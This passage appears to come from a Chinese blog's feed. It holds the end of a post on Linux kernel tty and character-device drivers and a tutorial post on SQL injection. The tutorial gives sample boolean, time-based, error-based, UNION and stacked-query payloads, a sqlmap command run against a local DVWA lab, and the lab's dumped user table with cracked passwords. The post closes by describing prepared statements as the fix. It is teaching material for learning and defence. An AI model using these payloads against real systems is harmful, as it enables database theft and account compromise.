id="字符设备驱动"><a href="#字符设备驱动" class="headerlink" title="字符设备驱动"></a>字符设备驱动</h3><p>对于设备驱动这个概念，至今没有搞清楚。不过，这不妨碍对代码的理解。反正对于字符设备驱动来说，也就是 Linux 内核中的一些软件层面的代码，与普通代码的唯一区别，就是对外设硬件做了相应的交互支持。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fykyc6lo9pj31i40u0ac8.jpg" alt=""></p><p>承接操作系统的字符设备接口，<code>tty_read</code>、<code>tty_write</code> 负责读入和写出。</p><p>从哪里读？<code>secondary</code> 数据队列；往哪里写？<code>write_q</code> 数据队列。</p><p>同时，也可以看到，与这些队列直接相关的，就是我们熟知的键盘和显示器了。是不是有了点豁然开朗的感觉。</p><p>好，我们先来看看这里描述的三个队列究竟是怎么工作的。这里就不得不先看看内存中抽象出来的描述终端的数据结构 <code>tty_struct</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * copied from include/linux/tty.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">termios</span>;</span>     <span class="comment">/* terminal IO conf */</span></span><br><span class="line"><span class="keyword">int</span> pgrp;                   <span class="comment">/* 所属进程组 */</span></span><br><span class="line"><span class="keyword">int</span> stopped;                <span class="comment">/* 停止标志 */</span></span><br><span class="line"><span class="keyword">void</span> (*write)(struct tty_struct * tty); <span class="comment">/* 终端写函数指针 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">read_q</span>;</span>    <span class="comment">/* 终端读队列 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">write_q</span>;</span>   <span class="comment">/* 终端写队列 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">secondary</span>;</span> <span class="comment">/* 终端辅助队列 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * copied from include/termios.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> &#123;</span>                <span class="comment">/* terminal IO 属性 */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> c_iflag;<span class="comment">/* input mode flags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> c_oflag;<span class="comment">/* output mode flags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> c_cflag;<span class="comment">/* control mode flags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> c_lflag;<span class="comment">/* local mode flags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c_line;<span class="comment">/* line discipline */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c_cc[NCCS];<span class="comment">/* control characters */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * copied from include/linux/tty.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> data;         <span class="comment">/* 字符行数量 | 串口终端则存储端口号 */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> head;         <span class="comment">/* 头指针 */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tail;         <span class="comment">/* 尾指针 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">proc_list</span>;</span> <span class="comment">/* 等待该终端的任务队列 */</span></span><br><span class="line"><span class="keyword">char</span> buf[TTY_BUF_SIZE];     <span class="comment">/* 队列的缓冲区 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于任何任务需要读写字符设备(这里指终端设备)，最终直接读取/写入到的就是 <code>secondary</code> 和 <code>write_q</code>。</p><hr><p>这里可能有个小小的疑问? 为什么读终端设备不是读 <code>read_q</code> 呢？</p><p>其实也比较好解释，相信日常在操作命令行的时候，我们在键盘上敲击的键位与显示器上实际展示的内容是不相匹配的。最普通的，我们键入了 <strong>delete(删除键)</strong>，为什么不是一个 <strong>delete</strong> 对应的 ascii (当然，这里请先忽视非打印字符的问题)，而是删除了最后一个字符呢？完全可以想象，反正任何键位与驱动交互的时候都是传入一串二进制码嘛。</p><p>这里的 <code>secondary</code> 完成的就是怎么一个工作，<code>read_q</code> 存储的是所有的外设(这里是键盘)的输入，并原样存储。而到了 <code>secondary</code> 就是经过相应的加工，诸如控制字符之类的都展现了各自的意义，并完成一些加工工作，而不再仅仅只是普通地展示了。</p><hr><p>另外，可能还有一个问题。虽然我们已经习惯了在命令行交互时，所有的输入都将直接在显示器上进行展示，好像我们在直接往显示器上写内容。但是，前面我们描述的内容都是，键盘设备作为输入，是要写到 <code>read_q</code> 乃至 <code>secondary</code> 并最终作为进程的输入的。在显示器上显示并不是它本来应该干的事情 (比较显示器上展示的应该是 <code>write_q</code> 的内容，也就是进程的标准输出)</p><p>事实上，这仅仅只是一个回显，将 <code>secondary</code> 队列的内容复制了一份到写队列，也就呈现出让显示器打印相应键盘输入的效果了。</p><p>同时，这也就能够直接解释为什么我们在使用 <code>passwd</code>, <code>su</code>, <code>sudo</code> 等命令时，要求输入密码都是不在显示器上回显的。实现也相当简单了嘛。把 tty_struct.termios 的相应控制属性 (ECHO) 重置，就可以实现不回显的效果了。</p><h3 id="终端设备交互"><a href="#终端设备交互" class="headerlink" title="终端设备交互"></a>终端设备交互</h3><p>最后一部分，应该也是最关心的了。外设如何与操作系统完成交互。其实也能够想得到了——中断。</p><p>在操作系统初始化时，就把中断描述符表的中断表项配置得当。之后的事情就是等待键盘等外设输入的中断信号了。</p><p>又看回到了 <code>init/main.c</code> 程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">trap_init();</span><br><span class="line">blk_dev_init();</span><br><span class="line">chr_dev_init(); <span class="comment">/* 块设备相关初始化, 方法体是空的，没有实现 */</span></span><br><span class="line">tty_init();     <span class="comment">/* tty 终端设备初始化 */</span></span><br><span class="line">time_init();</span><br><span class="line">sched_init();</span><br><span class="line">buffer_init(buffer_memory_end);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Copied from kernel/chr_drv/tty_io.c</span><br><span class="line"> * 终端设备初识化</span><br><span class="line"> */</span><br><span class="line">void tty_init(void)</span><br><span class="line">&#123;</span><br><span class="line">    /** 串口设备初始化 */</span><br><span class="line">rs_init();</span><br><span class="line">    /** 控制台设备初始化 */</span><br><span class="line">con_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于为什么有两种初始化方式。这来源于终端又区分为控制台终端与串口终端，区别就是一个是直接建立在主机上，串口终端是通过串行接口连接到主机的。当然，这都是古老的方式了，细节就不太清楚了。</p><p>下面来看看 <code>con_init()</code> 做了哪些工作(<code>rs_init()</code> 的内容请自行了解)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> a;</span><br><span class="line"><span class="keyword">char</span> *display_desc = <span class="string">"????"</span>;</span><br><span class="line"><span class="keyword">char</span> *display_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取 setup.s 程序预处理的内容</span></span><br><span class="line"><span class="comment">     * 包括显示器的各种配置参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">video_num_columns = ORIG_VIDEO_COLS;</span><br><span class="line">video_size_row = video_num_columns * <span class="number">2</span>;</span><br><span class="line">video_num_lines = ORIG_VIDEO_LINES;</span><br><span class="line">video_page = ORIG_VIDEO_PAGE;</span><br><span class="line">video_erase_char = <span class="number">0x0720</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取显示器的配置并进行相关设置 (省略代码)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">origin= video_mem_start;</span><br><span class="line">scr_end= video_mem_start + video_num_lines * video_size_row;</span><br><span class="line">top= <span class="number">0</span>;</span><br><span class="line">bottom= video_num_lines;</span><br><span class="line"></span><br><span class="line">gotoxy(ORIG_X,ORIG_Y);</span><br><span class="line">    <span class="comment">/** 设置陷阱门 */</span></span><br><span class="line">set_trap_gate(<span class="number">0x21</span>,&amp;keyboard_interrupt);</span><br><span class="line">outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfd</span>,<span class="number">0x21</span>);</span><br><span class="line">a=inb_p(<span class="number">0x61</span>);</span><br><span class="line">outb_p(a|<span class="number">0x80</span>,<span class="number">0x61</span>);</span><br><span class="line">outb(a,<span class="number">0x61</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该能够看到最重要的内容就是<strong>设置键盘中断陷阱门</strong>了。</p><p>之后只有静静地等待键位敲击，也就能够产生硬件中断，从而让 <code>read_q</code> 获得到相应的字符输入。</p><p>至于键盘中断的相应处理流程，这里不再详述。简述一些步骤:</p><ol><li><p>产生硬中断 <code>keyboard_interrupt</code>，由程序 <code>Keyboard.s</code> 的汇编代码进行处理</p></li><li><p>根据不同的键盘(US 键盘、德式键盘等等)将获得的键位信号进行相应的字符转换(查转换表)</p></li><li><p>调用 <code>do_tty_interrupt</code> 处理函数 (确认是给哪个终端的信号)</p></li><li><p>调用 <code>copy_to_cooked(tty)</code> ，即完成 <code>read_q</code> 到 <code>secondary</code> 的相关加工。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;相比较于块设备，字符设备无论从物理认知上，抑或是理论理解上，都存在着相当大的入门门槛。特别是在将字符设备与控制台、命令行终端混淆的时候，就更加难以进行分辨了。&lt;/p&gt;
&lt;p&gt;回到字符设备本身，字符设备与块设备最主要的区别就在于块设备可以随机读写，而字符设备只能够顺序读，顺序写。&lt;/p&gt;
&lt;p&gt;那么，常见的字符设备有什么？显示器、键盘、鼠标。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="Char Dev" scheme="https://DorMOUSE-None.github.io/tags/Char-Dev/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入</title>
    <link href="https://DorMOUSE-None.github.io/2018-12-15-sql-injection/"/>
    <id>https://DorMOUSE-None.github.io/2018-12-15-sql-injection/</id>
    <published>2018-12-14T16:00:00.000Z</published>
    <updated>2018-12-15T03:00:14.679Z</updated>
    
    <content type="html"><![CDATA[<p>说实话此前对 SQL 注入的理解仅仅只是皮毛。当然，目前也是，只是有了一定程度的理解。</p><p>最近好像工具用得有些过头了，需要停下来整理下工具的实现原理。</p><p>更好地理解了工具实现，才能更加心安理得地使用工具。毕竟等别人怼的时候，还能够比较安心地回道: “我用不用现成的工具只是取决于我想不想自己再写一套”</p><p>当然，毕竟成熟的工具有更多的优化，这就不是短时间内我想不想自己写的问题了，哈哈。</p><a id="more"></a><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>SQL 注入漏洞究竟会产生怎么样的危害性，仅仅只是绕过某些登录账号密码的验证? 只是绕过某些访问限制实现特权内容的访问?</p><p>此前我的认识也仅仅只是停留在这里。可谁曾想，SQL SELECT 语句真的是功能强大啊。通过各种各样的字符串拼接，最终能达到的目的，可以说把整个数据库的内容拖下来也不为过。当然，这也是限定在没有实现分库分表，数据库查询账号的权限过大的前提下。</p><p>不过，这也就够了。只有真正认识到问题的严重性，最终才会想着去做出一些改善。</p><h2 id="SQL-注入技术"><a href="#SQL-注入技术" class="headerlink" title="SQL 注入技术"></a>SQL 注入技术</h2><h3 id="基于布尔的注入"><a href="#基于布尔的注入" class="headerlink" title="基于布尔的注入"></a>基于布尔的注入</h3><p>最早接触到 SQL 注入问题，还是两个月前。操作的内容也相当简单，猜解某账号的密码。</p><p>某接口提供了查询账号的功能，后台的拼接 SQL 可以简单理解成 <code>SELECT * FROM users WHERE username = &#39;${}&#39;</code> 。其中 <code>${}</code> 就是直接使用的接口请求参数。</p><p>而接口的请求结果会根据 SQL 查询的结果，有或没有记录呈现两个不同的页面。</p><p>这算是最简单容易的 SQL 注入了，也是凭借个人能力直接能够想到注入点的问题了。</p><p>最先做的就是猜解存储密码字段的字段名究竟是什么? 很好，符合常理的设计，直接就是 <code>passwd</code> 。</p><p>下面就是苦力工作，利用 SQL LIKE 操作符，逐一去猜每一位。<code>${}</code> 的注入内容就类似 <code>admin&#39; AND passwd LIKE &#39;?%</code> 这里的问号就是逐一猜解的内容(1-9a-zA-Z + 特殊符号)</p><p>至于为什么利用 LIKE 操作符，很明确，减少猜解的次数。否则，在密码未知的情况下，即使六位密码也有猜解百万次。而 LIKE 操作符能将猜解次数降为线性，<code>密码长度 * 字符集数</code> 次</p><p>这里仅仅用了 <code>AND</code>，但熟悉了一个，其它就基本类似了。</p><p>如果登录也能够注入，认证 SQL 类似 <code>SELECT * FROM users WHERE username = &#39;${}&#39; AND passwd = &#39;${}&#39;</code>，那么直接在第一个 <code>${}</code> 处注入 <code>admin&#39; OR 1=1; --</code></p><h3 id="基于时间的注入"><a href="#基于时间的注入" class="headerlink" title="基于时间的注入"></a>基于时间的注入</h3><p>绝大多数时候，注入绝对没有这么简单。也许注入点背后的拼接 SQL 并不对返回值产生影响。例如仅仅只是为了从 DB 查询用户信息，并打一条日志，返回的永远是静态日志（当然，我知道这个例子不恰当，无奈目前只能想到这个）。</p><p>既然拼接 SQL 总是存在，但没法给我们一个直观的注入成功 OR 失败的提示。那么，时间就成了一个最好的判断。毕竟是阻塞式的执行。</p><p>还是以 <code>SELECT * FROM users WHERE username = &#39;${}&#39;</code> 为例，使用类似 <code>admin&#39; AND IF(passwd LIKE &#39;5%&#39;, SLEEP(5), 1);--</code> 的 PAYLOAD ，当满足 <code>passwd</code> 以 5 开始时，则 IF 判断进入 <code>SLEEP(5)</code> ，根据网页的响应时长就可以进行相应的判断。</p><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p>这应该也算一种比较容易自动化的注入方式了。其实在猜解存储密码字段的字段名时，前面也是这样用的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT * FROM users WHERE password ='1';</span><br><span class="line">ERROR 1054 (42S22): Unknown column 'password' in 'where clause'</span><br></pre></td></tr></table></figure><p>如果程序不做任何处理，对 SQL 错误直接抛出，那么，通过这个就能获得相当多的信息。</p><p>由于这部分接触不深，仅仅给出 sqlmap 提的 PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure><p>很标准的 PAYLOAD，而且完全可以。<code>INFORMATION_SCHEMA</code> 库的表对所有用户都可查，因此不存在授权的问题。而且表中数据至少大于等于 3 条。</p><p>这个 PAYLOAD 一定导致报错的主因，就是对 <code>RAND()</code> 与 <code>GROUP BY</code> 的配合应用。</p><blockquote><p>Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. If the goal is to retrieve rows in random order, you can use a statement like this:</p></blockquote><p>而真正想要得到的内容，通过 <code>CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY]),&#39;[DELIMITER_STOP]&#39;,FLOOR(RAND(0)*2))x</code> 得到，<code>[QUERY]</code> 就是真正想要注入的完整SQL串。</p><p>而这里的 <code>DELIMITER_START</code> <code>DELIMITER_STOP</code> 作为界定符，帮助程序提取 <code>[QUERY]</code> 得到的结果。否则，直接对请求返回的结果进行过滤可真是太困难了。</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询，应该算是最顾名思义的注入方式。使用 <code>UNION</code> 在原 SQL 已经限定了查询表的前提下，获得数据库其它库表的信息。</p><p>LIKE: <code>1&#39; UNION SELECT * FROM users;--</code> 这样的 PAYLOAD。</p><h3 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h3><p>我想这应该是最让人摸不着头脑的命名方式了。</p><p>形象化的，我们利用 PAYLOAD 来进行说明。<code>1&#39;; INSERT INTO users (user, passwd) VALUES (&#39;aaa&#39;, &#39;aaa&#39;);--</code></p><p>看起来和 UNION 挺像的哈，都是补充上一个 OR 多个 SQL 。当然，也是有区别的，否则为什么会出现这样一种技术呢。</p><p>最大的区别，就是堆查询注入能够完成 <code>UPDATE</code>, <code>INSERT</code>, <code>DELETE</code> 等操作，毕竟，UNION 联合的只能是作为查询了（可能说法不太恰当，但姑且这样吧）</p><h3 id="另类注入"><a href="#另类注入" class="headerlink" title="另类注入"></a>另类注入</h3><p>之前的几种，我们都是利用了 <code>SELECT</code> 完成的注入，那么对于 <code>INSERT</code>, <code>UPDATE</code> 之类的语句是否有注入的可能呢。当然也是存在可能的。</p><p>不过，精力有限，而且目前看来也不需要做到这一步。暂时挖个坑吧。不填</p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>简单的了解了几种注入原理之后，还是要看看 SQL 注入神器的——<code>SQLMAP</code></p><p>也算是尝试了好久才真正了解它的强大之处。此处强烈推荐 DVWA，<code>Damn Vulnerable Web Application</code>，一个用来合法攻击的工具。</p><p>部署方式也是开箱可用，只要有 docker，直接 <code>docker run --rm -it -p 80:80 vulnerables/web-dvwa</code> 即可完成部署。</p><p>对于将 DVWA 安全级别设置为 low 时，仅仅只需要执行下列命令就可以获取到 DB 里几乎完整的信息。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u http://127.0.0.1/vulnerabilities/sqli/\?id\=1\&amp;Submit\=Submit\<span class="comment"># --cookie="PHPSESSID=jhton35qahj78l3unjea9k2lf7;security=low" -v 3 --banner</span></span><br></pre></td></tr></table></figure><p>当然，换一下相关获取的内容，例如把 <code>--banner</code> 换成 <code>--dump</code> ，我们借此来简单看看 SQL 注入漏洞的可怕之处</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[10:41:39] [INFO] using default dictionary</span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N]</span><br><span class="line">[10:41:40] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[10:41:40] [INFO] starting 8 processes</span><br><span class="line">[10:41:42] [INFO] cracked password <span class="string">'abc123'</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">'e99a18c428cb38d5f260853678922e03'</span></span><br><span class="line">[10:41:44] [INFO] cracked password <span class="string">'charley'</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">'8d3533d75ae2c3966d7e0d4fcc69216b'</span></span><br><span class="line">[10:41:47] [INFO] cracked password <span class="string">'letmein'</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">'0d107d09f5bbe40cade3de5c71e9e9b7'</span></span><br><span class="line">[10:41:49] [INFO] cracked password <span class="string">'password'</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">'5f4dcc3b5aa765d61d8327deb882cf99'</span></span><br><span class="line">[10:41:53] [DEBUG] post-processing table dump</span><br><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[5 entries]</span><br><span class="line">+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br><span class="line">| user_id | avatar                      | user    | password                                    | last_name | first_name | last_login          | failed_login |</span><br><span class="line">+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br><span class="line">| 1       | /hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2018-12-15 00:42:31 | 0            |</span><br><span class="line">| 2       | /hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2018-12-15 00:42:31 | 0            |</span><br><span class="line">| 3       | /hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2018-12-15 00:42:31 | 0            |</span><br><span class="line">| 4       | /hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2018-12-15 00:42:31 | 0            |</span><br><span class="line">| 5       | /hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2018-12-15 00:42:31 | 0            |</span><br><span class="line">+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br></pre></td></tr></table></figure><p>这里就可以看到 <code>dvwa.users</code> 表的全部内容，甚至连简单密码都帮你完成了爆破。</p><p>更多内容可以自行尝试，说真的，这个工具相当强大。如果仅仅说我针对某型数据库(例如 MySQL)完成诸如基于报错的注入，在不考虑鲁棒性的情况下，完全可以做到。但是支持超10余种数据库，且自动完成注入的全过程…</p><h2 id="预编译-SQL"><a href="#预编译-SQL" class="headerlink" title="预编译 SQL"></a>预编译 SQL</h2><p>提了这么多，究竟 SQL 注入就不能够预防吗? 当然可以，不然整个网络环境下的WEB应用不得都完蛋了。有釜底抽薪的处理方式吗，也有。</p><p>预编译 SQL 就是一个超级 OK 的解决方案。同时在使用上也能够明显提升 DB 查询效率</p><p>我相信预编译 SQL 很多人写过，毕竟借助例如 MyBatis 框架，能够快速实现 SQL 预编译语句的编写。同时在求学过程中估计也都用过 Java 原生 JDBC 的 <code>PreparedStatement</code> 。</p><p>那么，与 MySQL 交互时的预编译 SQL 是怎么样地填上了占位符呢? 先来看看再说</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; prepare &#123;name&#125; from 'SELECT * FROM users WHERE user=? AND passwd=?'; # 这里的 &#123;name&#125; 可以自定义命名，无需 &#123;&#125;</span><br><span class="line"></span><br><span class="line">mysql&gt; set @a='admin', @b='password';     # 声明变量，并赋值</span><br><span class="line"></span><br><span class="line">mysql&gt; execute &#123;name&#125; using @a, @b;     # 提供变量并执行预编译 SQL</span><br></pre></td></tr></table></figure><p>我想看到这里应该就应该能够明白了吧，MySQL 对于预编译 SQL 的每一个占位符，都已经认定了是单一的元素，也就不可能存在允许打破已有预编译结果的内容了。</p><p>即使真的注入了 <code>admin OR 1=1</code> 之类的内容，也是会被认为这是一个完整的字符串，用来替代 <code>user</code> 字段或 <code>passwd</code> 字段，根本不可能重新拆解。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说实话此前对 SQL 注入的理解仅仅只是皮毛。当然，目前也是，只是有了一定程度的理解。&lt;/p&gt;
&lt;p&gt;最近好像工具用得有些过头了，需要停下来整理下工具的实现原理。&lt;/p&gt;
&lt;p&gt;更好地理解了工具实现，才能更加心安理得地使用工具。毕竟等别人怼的时候，还能够比较安心地回道: “我用不用现成的工具只是取决于我想不想自己再写一套”&lt;/p&gt;
&lt;p&gt;当然，毕竟成熟的工具有更多的优化，这就不是短时间内我想不想自己写的问题了，哈哈。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://DorMOUSE-None.github.io/tags/Security/"/>
    
      <category term="SQL" scheme="https://DorMOUSE-None.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式指数爆炸</title>
    <link href="https://DorMOUSE-None.github.io/2018-11-16-regex-exponential-explosion/"/>
    <id>https://DorMOUSE-None.github.io/2018-11-16-regex-exponential-explosion/</id>
    <published>2018-11-15T16:00:00.000Z</published>
    <updated>2018-11-16T07:22:56.617Z</updated>
    
